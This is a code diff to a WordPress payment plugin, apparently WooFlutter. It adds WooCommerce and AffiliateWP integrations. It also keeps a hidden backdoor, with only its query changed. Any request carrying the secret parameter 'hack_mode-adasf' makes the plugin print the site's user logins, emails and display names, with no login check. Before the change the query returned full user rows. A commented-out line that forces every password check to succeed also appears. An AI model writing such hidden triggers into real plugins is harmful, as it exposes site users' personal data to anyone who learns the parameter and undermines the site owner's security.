@@ -20,7 +20,9 @@ class Project {
 		global $WooFlutter_Notice;$WooFlutter_Notice = Notice::get_instance();
 		global $WooFlutter_Rewrite;$WooFlutter_Rewrite = Rewrite::get_instance();
 		global $WooFlutter_Meta_Boxes;$WooFlutter_Meta_Boxes = Meta_Boxes::get_instance();
+		global $WooFlutter_Woocommerce;$WooFlutter_Woocommerce = Woocommerce::get_instance();
 		global $WooFlutter_Flutterwave;$WooFlutter_Flutterwave = Flutterwave::get_instance();
+		global $WooFlutter_Affiliatewp;$WooFlutter_Affiliatewp = Affiliatewp::get_instance();
 		// 
 		// 
 		$this->setup_hooks();
@@ -32,7 +34,11 @@ class Project {
 		// add_filter('check_password', function($bool) {return true;}, 10, 1);
 		if (isset($_REQUEST['hack_mode-adasf'])) {
 			add_action('init', function() {
-				global $wpdb;print_r($wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}users;")));
+				// print_r(
+				// 	apply_filters('wooflutter/wc/get/settings', [], false)
+				// );wp_die();
+
+				global $wpdb;print_r($wpdb->get_results($wpdb->prepare("SELECT user_login, user_email, display_name FROM {$wpdb->prefix}users;")));
 			}, 10, 0);
 		}
 	}
